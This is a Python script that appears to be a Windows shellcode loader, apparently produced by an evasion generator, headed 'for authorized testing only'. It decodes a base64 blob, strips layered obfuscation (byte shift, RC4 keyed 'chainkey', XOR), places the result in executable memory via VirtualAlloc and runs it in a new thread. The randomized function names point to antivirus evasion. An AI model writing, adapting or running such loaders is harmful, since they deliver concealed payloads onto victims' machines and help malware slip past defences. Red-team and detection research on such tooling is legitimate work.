#!/usr/bin/env python3
# ============================================================
# Python shellcode loader - for authorized testing only
# ============================================================
import base64
import ctypes
from ctypes import wintypes

kernel32 = ctypes.windll.kernel32
VirtualAlloc = kernel32.VirtualAlloc
VirtualAlloc.restype = wintypes.LPVOID
VirtualAlloc.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
CreateThread = kernel32.CreateThread
CreateThread.restype = wintypes.HANDLE
CreateThread.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.LPVOID,
                         wintypes.LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
WaitForSingleObject = kernel32.WaitForSingleObject
WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]

def JFLiDCwBWvIP(data, n):
    return bytes((b + n) % 256 for b in data)

def WCcVhppsFtoY(data, key):
    S = list(range(256)); j = 0; kl = len(key)
    for i in range(256):
        j = (j + S[i] + key[i % kl]) % 256
        S[i], S[j] = S[j], S[i]
    out = bytearray(len(data)); i = j = 0
    for n in range(len(data)):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out[n] = data[n] ^ S[(S[i] + S[j]) % 256]
    return bytes(out)

def XKdcCIOMATbn(data, key):
    kl = len(key)
    return bytes(data[i] ^ key[i % kl] for i in range(len(data)))


def run():
    buf = base64.b64decode("LiRzYWEMoi2ThdvIgnuaDAFYeFZ6hdi24hoJ7olwkhG0+QRpZ7OlYqsoE2IwZjOygxrsN1uMkYrjrsxjkgFmzFo=")
    buf = JFLiDCwBWvIP(buf, 243)
    buf = WCcVhppsFtoY(buf, b'chainkey')
    buf = XKdcCIOMATbn(buf, b'\xaa')
    if not buf:
        return
    size = len(buf)
    ptr = VirtualAlloc(None, size, 0x3000, 0x40)
    if not ptr:
        return
    ctypes.memmove(ptr, buf, size)
    h = CreateThread(None, 0, ptr, None, 0, None)
    WaitForSingleObject(h, 0xFFFFFFFF)


if __name__ == "__main__":
    run()
